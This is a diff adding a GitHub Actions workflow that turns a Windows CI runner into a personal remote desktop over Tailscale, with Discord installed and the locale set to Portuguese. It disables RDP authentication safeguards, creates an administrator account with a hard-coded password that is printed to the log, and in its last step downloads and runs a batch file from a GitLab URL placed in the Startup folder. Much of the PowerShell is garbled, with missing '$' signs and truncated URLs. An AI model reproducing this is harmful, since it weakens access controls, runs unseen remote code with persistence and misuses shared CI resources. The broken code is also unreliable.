@@ -1,0 +1,133 @@
+name: win 11 + tailscale + Discord + Portugues (User Customizado)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 350
+
+    steps:
+      - name: Configure System Language to Portuguese (PT-BR)
+        run: |
+          Set-WinSystemLocale -SystemLocale pt-BR
+          Set-WinUserLanguageList -LanguageList (New-WinUserLanguageList -Language pt-BR) -Force
+          Set-Culture pt-BR
+
+      - name: Configure Core RDP Settings
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          netsh advfirewall firewall add rule name="RDP-Tailscale" `
+            dir=in action=allow protocol=TCP localport=3389
+
+          Restart-Service -Name TermService -Force
+
+      - name: Create RDP User with NEW Fixed Password
+        run: |
+          \$username = "runneradmin"
+          \$password = "minacraft1."
+          
+          securePass = ConvertTo-SecureString password -AsPlainText -Force
+          
+          if (Get-LocalUser -Name \$username -ErrorAction SilentlyContinue) {
+              Set-LocalUser -Name username -Password securePass
+              Write-Host "✅ Senha do usuario \$username atualizada com sucesso!"
+          } else {
+              New-LocalUser -Name username -Password securePass -AccountNeverExpires
+              Write-Host "✅ Usuario \$username criado com a nova senha!"
+          }
+          
+          Add-LocalGroupMember -Group "Administrators" -Member \$username -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member \$username -ErrorAction SilentlyContinue
+         
+          echo "RDP_CREDS=User: \$username | Password: password" >> env:GITHUB_ENV
+
+      - name: Install Discord via Winget
+        run: |
+          winget source update
+          winget install --id Discord.Discord --exact --silent --accept-source-agreements --accept-package-agreements
+
+      - name: Install Tailscale
+        run: |
+          \$tsUrl = "https://tailscale.com"
+          installerPath = "env:TEMP\tailscale.msi"
+         
+          Invoke-WebRequest -Uri tsUrl -OutFile installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item \$installerPath -Force
+
+      - name: Establish Tailscale Connection
+        run: |
+          & "\(env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=\){{ secrets.TAILSCALE_AUTHKEY }} --hostname=gh-runner-\(env:GITHUB_RUN_ID --unattended\)tsIP = \(null\)retries = 0
+          while (-not tsIP -and retries -lt 10) {
+              \(tsIP = & "\)env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              \$retries++
+          }
+         
+          if (-not \$tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=tsIP" >> env:GITHUB_ENV
+     
+      - name: Verify RDP Accessibility
+        run: |
+          Write-Host "Tailscale IP: \$env:TAILSCALE_IP"
+          testResult = Test-NetConnection -ComputerName env:TAILSCALE_IP -Port 3389
+          if (-not \$testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to RDP port 3389 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+      - name: Maintain Connection + Watch RDP User
+        run: |
+          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: runneradmin"
+          Write-Host "Password: $env:RDP_CREDS"
+          Write-Host "==================`n"
+
+          \$rdpProfile = "C:\Users\runneradmin"
+          startupPath = "rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+          \$downloadUrl = "https://gitlab.com"
+          downloadPath = "startupPath\Downloads.bat"
+
+          while (\$true) {
+              if (Test-Path \$rdpProfile) {
+                  try {
+                      if (-not (Test-Path \$startupPath)) {
+                          New-Item -ItemType Directory -Path \$startupPath -Force | Out-Null
+                      }
+
+                      Invoke-WebRequest -Uri downloadUrl -OutFile downloadPath -UseBasicParsing
+                      Write-Host "✅ Downloads.bat copied to \$downloadPath"
+
+                      cmd /c \$downloadPath
+                      Write-Host "✅ Downloads.bat executed successfully"
+                      break
+                  }
+                  catch {
+                      Write-Host "❌ Error copying or executing Downloads.bat: (_.Exception.Message)"
+                      break
+                  }
+              }
+              else {
+                  Write-Host "[\$(Get-Date)] Waiting for runneradmin profile to be created... (Faca o primeiro login via RDP para gerar o perfil)"
+                  Start-Sleep -Seconds 30
+              }
+          }
+
+          while (\$true) {
+              Write-Host "[\$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 300
+          }
